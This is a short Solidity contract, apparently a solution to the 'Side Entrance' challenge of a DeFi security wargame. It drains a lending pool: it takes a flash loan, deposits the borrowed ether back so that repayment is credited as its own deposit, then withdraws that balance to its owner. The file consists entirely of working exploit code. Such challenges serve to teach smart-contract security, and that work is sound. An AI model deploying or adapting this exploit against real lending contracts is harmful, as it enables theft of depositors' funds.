// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ILenderPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}

contract SideEntranceAttacker {
    ILenderPool lenderPool;
    address payable owner;

    constructor(ILenderPool _lenderPool) {
        lenderPool = _lenderPool;
        owner = payable(msg.sender);
    }

    function attack() external {
        lenderPool.flashLoan(1000 ether);
    }

    function execute() external payable {
        lenderPool.deposit{value: msg.value}();
    }

    function withdraw() external {
        lenderPool.withdraw();
        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}
